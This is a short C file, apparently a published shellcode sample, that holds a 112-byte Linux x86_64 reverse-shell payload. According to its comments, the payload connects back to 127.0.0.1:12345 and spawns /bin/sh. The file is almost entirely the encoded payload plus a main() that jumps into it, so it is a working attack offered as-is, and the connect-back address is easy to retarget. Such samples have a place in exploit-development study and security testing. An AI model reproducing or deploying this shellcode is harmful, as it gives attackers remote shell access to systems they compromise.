// by MMxM (@hc0d3r) ~ 112 bytes
// linux x86_64 connect back on 127.0.0.1:12345
// and execve("/bin/sh",["/bin/sh"],[0]);

unsigned const char sc[]=
"\x64\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31"
"\xd2\xb0\x29\x66\xff\xc6\x40\xb7\x02\x0f\x05\x48"
"\xbe\x02\xff\x30\x39\x7f\x66\x06\x01\x56\x80\x74"
"\x24\x01\xff\x66\x81\x74\x24\x05\x66\x06\x48\x89"
"\xe6\x48\x89\xc7\xb0\x2a\xb2\x10\x0f\x05\x48\x31"
"\xc0\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff"
"\xc6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31"
"\xd2\xb0\x3b\x48\xbf\x66\x2f\x62\x69\x6e\x2f\x73"
"\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

int main(void){
	__asm__ ("jmp sc");
}
